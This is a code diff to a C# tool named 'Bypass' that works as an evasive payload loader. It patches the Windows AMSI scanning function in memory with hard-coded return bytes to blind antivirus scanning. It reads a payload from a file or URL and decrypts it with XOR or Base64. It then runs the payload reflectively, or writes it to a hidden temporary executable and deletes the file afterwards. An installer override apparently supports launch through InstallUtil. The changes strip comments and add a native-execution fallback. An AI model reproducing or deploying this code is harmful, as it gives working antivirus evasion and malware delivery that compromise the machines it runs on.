@@ -44,7 +44,6 @@ namespace Bypass
         private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         // ==================== GLOBAL STATE ====================
-        private static object[] _globalArgs = null;
         private static bool _debugMode = false;
 
         // ==================== DEBUG HELPER ====================
@@ -95,7 +94,6 @@ namespace Bypass
                 {
                     Console.Write($"  {i:X4}: ");
 
-                    // Hex bytes
                     for (int j = 0; j < 16; j++)
                     {
                         if (i + j < bytesToShow)
@@ -106,7 +104,6 @@ namespace Bypass
 
                     Console.Write(" ");
 
-                    // ASCII representation
                     for (int j = 0; j < 16; j++)
                     {
                         if (i + j < bytesToShow)
@@ -151,17 +148,15 @@ namespace Bypass
 
                 DebugLogger.HexDump(result, "Decrypted data", 128);
 
-                // Validate decryption - check for valid PE header (optional)
-                if (result.Length > 2 && result[0] == 0x4D && result[1] == 0x5A) // MZ
+                if (result.Length > 2 && result[0] == 0x4D && result[1] == 0x5A)
                 {
                     DebugLogger.Log("Valid PE header found after decryption");
                 }
                 else if (result.Length > 4)
                 {
-                    // Check for .NET assembly header
                     uint peOffset = BitConverter.ToUInt32(result, 0x3C);
                     if (peOffset < result.Length - 2 &&
-                        result[peOffset] == 0x50 && result[peOffset + 1] == 0x45) // PE
+                        result[peOffset] == 0x50 && result[peOffset + 1] == 0x45)
                     {
                         DebugLogger.Log("Valid .NET assembly found after decryption");
                     }
@@ -178,7 +173,6 @@ namespace Bypass
                 if (string.IsNullOrEmpty(key))
                     throw new ArgumentException("XOR key cannot be null or empty");
 
-                // XOR encryption is symmetric
                 return Decrypt(data, key);
             }
 
@@ -198,8 +192,7 @@ namespace Bypass
                         testBytes[i] ^= keyBytes[i % keyBytes.Length];
                     }
 
-                    // Common .NET assembly patterns to check
-                    return testBytes[0] == 0x4D && testBytes[1] == 0x5A; // MZ header
+                    return testBytes[0] == 0x4D && testBytes[1] == 0x5A;
                 }
                 catch
                 {
@@ -208,7 +201,7 @@ namespace Bypass
             }
         }
 
-        // ==================== AMSI PATCHING - SIMPLIFIED VERSION ====================
+        // ==================== AMSI PATCHING ====================
         private static class AMSIPatcher
         {
             public static bool PatchAMSI()
@@ -217,7 +210,6 @@ namespace Bypass
                 {
                     DebugLogger.Log("Starting AMSI patch procedure");
 
-                    // Load amsi.dll
                     IntPtr amsiModule = LoadLibrary(AMSI_DLL);
                     if (amsiModule == IntPtr.Zero)
                     {
@@ -227,7 +219,6 @@ namespace Bypass
 
                     DebugLogger.LogMemory($"{AMSI_DLL} loaded at", amsiModule);
 
-                    // Obtain AmsiScanBuffer address
                     IntPtr amsiScanBufferPtr = GetProcAddress(amsiModule, AMSI_SCAN_BUFFER);
                     if (amsiScanBufferPtr == IntPtr.Zero)
                     {
@@ -237,22 +228,18 @@ namespace Bypass
 
                     DebugLogger.LogMemory($"{AMSI_SCAN_BUFFER} address", amsiScanBufferPtr);
 
-                    // Patch depending on the arch
                     byte[] patchBytes;
-                    if (IntPtr.Size == 8)  // 64-bit
+                    if (IntPtr.Size == 8)
                     {
-                        // mov eax, 0x80070057 ; ret
                         patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                     }
-                    else  // 32-bit
+                    else
                     {
-                        // mov eax, 0x80070057 ; ret 0x18
                         patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                     }
 
                     DebugLogger.HexDump(patchBytes, "AMSI patch bytes");
 
-                    // Change memory protection
                     bool success = VirtualProtect(
                         amsiScanBufferPtr,
                         (UIntPtr)patchBytes.Length,
@@ -267,10 +254,8 @@ namespace Bypass
 
                     DebugLogger.Log($"Memory protection changed. Old protection: 0x{oldProtect:X}");
 
-                    // Apply patch
                     Marshal.Copy(patchBytes, 0, amsiScanBufferPtr, patchBytes.Length);
 
-                    // Verify patch
                     byte[] verifyBytes = new byte[patchBytes.Length];
                     Marshal.Copy(amsiScanBufferPtr, verifyBytes, 0, patchBytes.Length);
 
@@ -295,7 +280,8 @@ namespace Bypass
             }
         }
 
-        // ==================== PAYLOAD LOADING ====================
+        // ==================== FIXED PAYLOAD LOADER ====================
+        // ==================== FIXED PAYLOAD LOADER ====================
         private static class PayloadLoader
         {
             public static byte[] ReadLocalFile(string filePath)
@@ -339,44 +325,182 @@ namespace Bypass
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)protocolType;
             }
 
+            // FIXED: More reliable detection of .NET assemblies
             public static void ExecuteAssembly(byte[] assemblyBytes, string[] args)
             {
-                DebugLogger.Log($"Loading assembly ({assemblyBytes.Length} bytes)");
+                DebugLogger.Log($"Loading/Running payload ({assemblyBytes.Length} bytes)");
 
-                // Validate that it has the MZ header (optional, it can be a .NET assembly)
-                if (assemblyBytes.Length < 2)
+                // Validate that it has the MZ header
+                if (assemblyBytes.Length < 2 || assemblyBytes[0] != 0x4D || assemblyBytes[1] != 0x5A)
                 {
-                    DebugLogger.LogError("Assembly too small");
-                    throw new BadImageFormatException("Assembly too small");
+                    DebugLogger.LogError("Invalid executable - missing MZ header");
+                    throw new BadImageFormatException("Invalid executable format");
                 }
 
-                // Try to load assembly
-                Assembly assembly = Assembly.Load(assemblyBytes);
-                DebugLogger.Log($"Assembly loaded: {assembly.FullName}");
-
-                MethodInfo entryPoint = assembly.EntryPoint;
-                if (entryPoint == null)
+                // First, try to load as .NET assembly - if it fails, run as native
+                try
                 {
-                    DebugLogger.LogError("Assembly has no entry point");
-                    throw new EntryPointNotFoundException("Assembly has no entry point");
+                    DebugLogger.Log("Attempting to load as .NET assembly...");
+                    Assembly assembly = Assembly.Load(assemblyBytes);
+                    DebugLogger.Log($"Successfully loaded as .NET assembly: {assembly.FullName}");
+                    ExecuteDotNetAssembly(assembly, args);
                 }
-
-                DebugLogger.Log($"Entry point: {entryPoint.Name} in {entryPoint.DeclaringType?.FullName}");
-
-                object[] invokeArgs;
-                if (entryPoint.GetParameters().Length > 0)
+                catch (BadImageFormatException)
                 {
-                    invokeArgs = new object[] { args ?? Array.Empty<string>() };
+                    DebugLogger.Log("Not a .NET assembly, running as native executable");
+                    ExecuteNativeExecutable(assemblyBytes, args);
                 }
-                else
+                catch (Exception ex)
                 {
-                    invokeArgs = null;
+                    DebugLogger.LogError("Unexpected error loading assembly", ex);
+                    DebugLogger.Log("Falling back to native execution");
+                    ExecuteNativeExecutable(assemblyBytes, args);
                 }
+            }
 
-                DebugLogger.Log($"Invoking entry point with {(invokeArgs != null ? invokeArgs.Length : 0)} arguments");
+            private static void ExecuteDotNetAssembly(Assembly assembly, string[] args)
+            {
+                try
+                {
+                    MethodInfo entryPoint = assembly.EntryPoint;
+                    if (entryPoint == null)
+                    {
+                        DebugLogger.LogError("Assembly has no entry point");
+                        throw new EntryPointNotFoundException("Assembly has no entry point");
+                    }
 
-                entryPoint.Invoke(null, invokeArgs);
-                DebugLogger.Log("Assembly execution completed");
+                    DebugLogger.Log($"Entry point: {entryPoint.Name} in {entryPoint.DeclaringType?.FullName}");
+
+                    object[] invokeArgs;
+                    if (entryPoint.GetParameters().Length > 0)
+                    {
+                        invokeArgs = new object[] { args ?? Array.Empty<string>() };
+                    }
+                    else
+                    {
+                        invokeArgs = null;
+                    }
+
+                    DebugLogger.Log($"Invoking entry point with {(invokeArgs != null ? invokeArgs.Length : 0)} arguments");
+
+                    // Handle STA threads if needed (common for GUI apps)
+                    if (entryPoint.GetCustomAttribute<STAThreadAttribute>() != null)
+                    {
+                        DebugLogger.Log("Entry point requires STA thread, creating STA thread...");
+                        Exception threadException = null;
+                        System.Threading.Thread staThread = new System.Threading.Thread(() =>
+                        {
+                            try
+                            {
+                                entryPoint.Invoke(null, invokeArgs);
+                            }
+                            catch (Exception ex)
+                            {
+                                threadException = ex;
+                            }
+                        });
+                        staThread.SetApartmentState(System.Threading.ApartmentState.STA);
+                        staThread.Start();
+                        staThread.Join();
+
+                        if (threadException != null)
+                            throw threadException;
+                    }
+                    else
+                    {
+                        entryPoint.Invoke(null, invokeArgs);
+                    }
+
+                    DebugLogger.Log("Assembly execution completed");
+                }
+                catch (Exception ex)
+                {
+                    DebugLogger.LogError("Failed to execute .NET assembly", ex);
+                    throw;
+                }
+            }
+
+            private static void ExecuteNativeExecutable(byte[] executableBytes, string[] args)
+            {
+                string tempPath = null;
+
+                try
+                {
+                    // Save to temporary file with random name
+                    tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
+                    DebugLogger.Log($"Saving native executable to: {tempPath}");
+
+                    File.WriteAllBytes(tempPath, executableBytes);
+
+                    // Build argument string
+                    string arguments = args != null && args.Length > 0 ? string.Join(" ", args) : "";
+
+                    DebugLogger.Log($"Running native executable with arguments: {arguments}");
+
+                    // Create process start info
+                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    {
+                        FileName = tempPath,
+                        Arguments = arguments,
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+
+                    // Start and wait for process
+                    using (Process process = Process.Start(startInfo))
+                    {
+                        if (process != null)
+                        {
+                            DebugLogger.Log($"Native process started with ID: {process.Id}");
+
+                            // Read output asynchronously to avoid deadlocks
+                            string output = process.StandardOutput.ReadToEnd();
+                            string error = process.StandardError.ReadToEnd();
+
+                            process.WaitForExit();
+
+                            DebugLogger.Log($"Native process exited with code: {process.ExitCode}");
+
+                            if (!string.IsNullOrEmpty(output))
+                            {
+                                DebugLogger.Log($"Process output: {output}");
+                                if (_debugMode) Console.WriteLine($"[PROCESS OUTPUT] {output}");
+                            }
+
+                            if (!string.IsNullOrEmpty(error))
+                            {
+                                DebugLogger.Log($"Process error: {error}");
+                                if (_debugMode) Console.WriteLine($"[PROCESS ERROR] {error}");
+                            }
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    DebugLogger.LogError("Failed to execute native executable", ex);
+                    throw;
+                }
+                finally
+                {
+                    // Clean up temp file
+                    if (tempPath != null)
+                    {
+                        try
+                        {
+                            // Give some time for the process to fully release the file
+                            System.Threading.Thread.Sleep(500);
+                            File.Delete(tempPath);
+                            DebugLogger.Log("Temporary file deleted");
+                        }
+                        catch (Exception ex)
+                        {
+                            DebugLogger.LogError($"Failed to delete temp file: {ex.Message}");
+                        }
+                    }
+                }
             }
         }
 
@@ -402,8 +526,6 @@ namespace Bypass
                 };
 
                 parameters.XorEncrypted = !string.IsNullOrEmpty(parameters.XorKey);
-
-                // Set global debug mode
                 _debugMode = parameters.DebugMode;
 
                 DebugLogger.Log($"Parsed parameters:");
@@ -508,7 +630,6 @@ namespace Bypass
                 return;
             }
 
-            // Decode Base64 parameters if needed
             if (parameters.Base64Encoded)
             {
                 DebugLogger.Log("Decoding Base64 encoded parameters");
@@ -534,7 +655,6 @@ namespace Bypass
                 Console.WriteLine($"[+] XOR Decryption: Enabled");
             }
 
-            // Step 1: Patch AMSI (optional, continue if failure)
             DebugLogger.Log("Step 1: Patching AMSI");
             bool amsiPatched = AMSIPatcher.PatchAMSI();
             if (!amsiPatched)
@@ -543,7 +663,6 @@ namespace Bypass
                 Console.WriteLine("[!] AMSI patch failed (may not be needed for this payload)");
             }
 
-            // Step 2: Load payload data
             DebugLogger.Log("Step 2: Loading payload data");
             byte[] payloadData;
 
@@ -568,7 +687,6 @@ namespace Bypass
                 return;
             }
 
-            // Step 3: Decrypt if XOR encrypted
             if (parameters.XorEncrypted)
             {
                 DebugLogger.Log("Step 3: Decrypting XOR payload");
@@ -585,7 +703,6 @@ namespace Bypass
                 }
             }
 
-            // Step 4: Decode Base64 data if needed (for payload itself)
             if (parameters.Base64Encoded)
             {
                 DebugLogger.Log("Step 4: Decoding Base64 payload data");
@@ -601,7 +718,6 @@ namespace Bypass
                 }
             }
 
-            // Step 5: Execute payload
             DebugLogger.Log("Step 5: Executing payload");
             try
             {
@@ -622,7 +738,6 @@ namespace Bypass
             Console.WriteLine($"[+] Execution Finished");
         }
 
-        // Install and Uninstall methods required
         public override void Install(System.Collections.IDictionary savedState)
         {
             base.Install(savedState);
